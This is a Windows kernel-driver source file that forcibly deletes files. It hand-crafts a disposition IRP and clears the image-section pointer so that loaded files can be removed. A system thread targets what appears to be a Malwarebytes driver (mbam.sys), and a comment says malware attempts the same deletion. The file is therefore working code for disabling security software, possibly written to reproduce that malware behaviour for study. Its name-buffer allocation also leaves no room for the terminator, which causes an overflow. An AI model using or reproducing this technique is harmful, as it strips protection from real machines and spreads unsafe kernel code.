#include "common.h"
#include "io_ops.h"

 
namespace {

	IO_COMPLETION_ROUTINE IoCompletionRoutine;
	NTSTATUS
	IoCompletionRoutine(
		PDEVICE_OBJECT DeviceObj,
		PIRP Irp,
		PVOID Context
	)
	{
		UNREFERENCED_PARAMETER(DeviceObj);
		UNREFERENCED_PARAMETER(Context);

		KeSetEvent(Irp->UserEvent, 0, FALSE);
		IoFreeIrp(Irp);
		return STATUS_MORE_PROCESSING_REQUIRED;
	}

	NTSTATUS
	CreateAndSendIrpForDeletion
	(
		PFILE_OBJECT FileObj,
		HANDLE DeleteHandle
	)
	{
		TRACER();
		char buf = 1;
		auto DeviceObj = IoGetRelatedDeviceObject(FileObj);
		auto Irp = IoAllocateIrp(DeviceObj->StackSize, FALSE);
		if (Irp == nullptr)
			return STATUS_NO_MEMORY;

		KEVENT KEvent {};
		IO_STATUS_BLOCK iosb {};
		Irp->AssociatedIrp.SystemBuffer = &buf;
		Irp->UserEvent = &KEvent;
		Irp->UserIosb = &iosb;
		Irp->Tail.Overlay.Thread = KeGetCurrentThread();
		Irp->Tail.Overlay.OriginalFileObject = FileObj;
		Irp->RequestorMode = KernelMode;

		KeInitializeEvent(&KEvent, SynchronizationEvent, FALSE);

		auto stack = IoGetNextIrpStackLocation(Irp);
		stack->MajorFunction = IRP_MJ_SET_INFORMATION;
		stack->DeviceObject = DeviceObj;
		stack->FileObject = FileObj;
		if (FileObj->SectionObjectPointer->ImageSectionObject != nullptr)
			FileObj->SectionObjectPointer->ImageSectionObject = nullptr;
		stack->Parameters.SetFile.FileInformationClass = FileDispositionInformation;
		stack->Parameters.SetFile.FileObject = FileObj;
		stack->Parameters.SetFile.DeleteHandle = DeleteHandle;
		stack->Parameters.SetFile.Length = 1ul;

		IoSetCompletionRoutine(Irp,
							   IoCompletionRoutine,
							   nullptr,
							   TRUE, TRUE, TRUE);
		if (IoCallDriver(DeviceObj, Irp) == STATUS_PENDING)
			KeWaitForSingleObject(&KEvent,
								  Executive,
								  KernelMode,
								  TRUE,
								  nullptr);
		return Irp->IoStatus.Status;

	}

	NTSTATUS
	GetHandleAndFileObj(
		LPCWSTR FileName
	)
	{
		TRACER();
		IO_STATUS_BLOCK iosb;
		OBJECT_ATTRIBUTES ObjAttrs;
		UNICODE_STRING uTargetName {};
		RtlInitUnicodeString(&uTargetName, FileName);
		InitializeObjectAttributes(&ObjAttrs,
								   &uTargetName,
								   OBJ_CASE_INSENSITIVE,
								   nullptr,
								   nullptr);

		HANDLE FileHandle {};
		PFILE_OBJECT FileObj {};
		auto status = ZwCreateFile(&FileHandle,
								   0x100001, /* DELETE | FILE_READ_ACCESS */
								   &ObjAttrs,
								   &iosb,
								   nullptr,
								   FILE_ATTRIBUTE_NORMAL,
								   FILE_SHARE_READ | FILE_SHARE_DELETE,
								   FILE_OPEN,
								   FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
								   nullptr,
								   0);
		if (!NT_SUCCESS(status)) {
			DbgPrint("ZwCreateFile failed : 0x%08X\n", status);
			return status;
		}
		status = ObReferenceObjectByHandle(FileHandle,
										   0,
										   *IoFileObjectType,
										   KernelMode,
										   (PVOID*) &FileObj,
										   nullptr);
		if (NT_SUCCESS(status)) {
			ObfDereferenceObject(FileObj);
			status = CreateAndSendIrpForDeletion(FileObj, FileHandle);

		}
		ZwClose(FileHandle);
		return status;
	}

	 
}



NTSTATUS
IO_OPS::
CreateSystemThreadToDeleteFile()
{

	TRACER();
	HANDLE ThreadHandle;
	OBJECT_ATTRIBUTES ObjAttrs;
	InitializeObjectAttributes(&ObjAttrs, 
							   nullptr, 
							   OBJ_KERNEL_HANDLE, 
							   nullptr,
							   nullptr);
	auto ThreadRoutine = [](PVOID Context)
	{
		TRACER();
		UNREFERENCED_PARAMETER(Context);
		auto TargetPath = L"\\SystemRoot\\System32\\Drivers\\mbam.sys"; /* same file malware attempts to delete */
		auto status = GetHandleAndFileObj(TargetPath);
		if (!NT_SUCCESS(status))
			DbgPrint("[%s] FAILED:  0x%08Xl \n", __FUNCTION__, status);
		PsTerminateSystemThread(STATUS_SUCCESS);

	};
	auto Status = PsCreateSystemThread(&ThreadHandle,
									   THREAD_ALL_ACCESS,
									   nullptr,
									   nullptr,
									   nullptr,
									   ThreadRoutine,
									   nullptr);
	if (ThreadHandle > 0)
		ZwClose(ThreadHandle);
	return Status;
}
  


namespace {

#define FREE_WORKITEM_DATA  \
	IoFreeWorkItem(Data->WorkItemDelete); \
	ExFreePoolWithTag(Data->FileName, KEXP_TAG); \
	ExFreePoolWithTag(Context, KEXP_TAG);

#pragma warning(push)
#pragma warning(disable: 4533)
	IO_WORKITEM_ROUTINE WorkerRoutine;

	_Use_decl_annotations_
	VOID
	WorkerRoutine(
		PDEVICE_OBJECT DeviceObj,
		PVOID Context
	)
	{
		TRACER();
		UNREFERENCED_PARAMETER(DeviceObj);

		IO_STATUS_BLOCK StatusBlk;
		OBJECT_ATTRIBUTES ObjAttrs;
		auto Data = IO_OPS::PWORKITEM_DATA(Context);
		UNICODE_STRING uTargetName {};
		RtlInitUnicodeString(&uTargetName, Data->FileName);
		InitializeObjectAttributes(&ObjAttrs,
								   &uTargetName,
								   OBJ_CASE_INSENSITIVE,
								   nullptr,
								   nullptr);
		HANDLE FileHandle {};
		auto Status = ZwCreateFile(&FileHandle,
								   0x100001,
								   &ObjAttrs,
								   &StatusBlk,
								   nullptr,
								   FILE_ATTRIBUTE_NORMAL,
								   FILE_SHARE_READ | FILE_SHARE_DELETE,
								   FILE_OPEN,
								   FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
								   nullptr,
								   0);
		if (!NT_SUCCESS(Status)) {
			DbgPrint("[%s] ZwCreateFile failed : 0x%08Xl\n", __FUNCTION__,
					 Status);
			goto Exit;
		}

		FILE_DISPOSITION_INFORMATION Fdo {};
		Fdo.DeleteFile = TRUE;
		Status = ZwSetInformationFile(FileHandle,
									  &StatusBlk,
									  &Fdo,
									  sizeof(Fdo),
									  FileDispositionInformation);
		if (!NT_SUCCESS(Status))
			DbgPrint("[%s] ZwSetInformationFile failed : 0x%08Xl\n", __FUNCTION__,
					 Status);
		ZwClose(FileHandle);
	Exit:
		FREE_WORKITEM_DATA;

	}

#pragma warning(pop)
}


NTSTATUS
IO_OPS::
DeleteFile(
	LPCWSTR FileName
)
{
	TRACER();

	auto WorkItemData = (IO_OPS::PWORKITEM_DATA) ExAllocatePoolWithTag(NonPagedPool,
																	   sizeof(IO_OPS::WORKITEM_DATA),
																	   KEXP_TAG);
	if (!WorkItemData)
		return STATUS_NO_MEMORY;
	/* page fault in nonpageable area w/ ZwCreateFile (IRQL?), so allocated directly in NonPagedPool */
	WorkItemData->FileName = (wchar_t*) ExAllocatePoolWithTag(NonPagedPool,
															  wcslen(FileName) * 2,
															  KEXP_TAG);
	wcscpy(WorkItemData->FileName, FileName);
	WorkItemData->WorkItemDelete = IoAllocateWorkItem((PDEVICE_OBJECT) KDriverObj);
	IoQueueWorkItem(WorkItemData->WorkItemDelete,
					WorkerRoutine,
					DelayedWorkQueue,
					WorkItemData);
	return STATUS_SUCCESS;
}